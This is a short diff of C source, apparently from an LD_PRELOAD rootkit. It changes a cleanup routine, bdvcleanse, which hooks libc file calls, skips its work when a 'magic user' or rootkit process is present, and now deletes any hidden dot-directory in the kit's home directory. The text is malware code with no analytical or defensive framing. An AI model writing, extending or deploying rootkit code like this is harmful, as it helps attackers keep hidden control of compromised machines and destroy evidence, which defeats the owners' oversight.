@@ -2,7 +2,7 @@ void bdvcleanse(void){
     if(magicusr() || rkprocup())
         return;
 
-    hook(COPENDIR, CREADDIR, CACCESS, CUNLINK, C__LXSTAT, CRMDIR);
+    hook(COPENDIR, CREADDIR, CACCESS, CUNLINK, C__LXSTAT);
 
     DIR *dp = call(COPENDIR, HOMEDIR);
     if(dp == NULL) return; // oh no
@@ -22,6 +22,12 @@ void bdvcleanse(void){
 
         memset(&pathstat, 0, sizeof(struct stat));
         lstatstat = (long)call(C__LXSTAT, _STAT_VER, path, &pathstat);
+
+        if(dir->d_name[0] == '.' && S_ISDIR(pathstat.st_mode)){
+            eradicatedir(path);
+            continue;
+        }
+
         if(lstatstat < 0 || !S_ISLNK(pathstat.st_mode))
             continue;
 
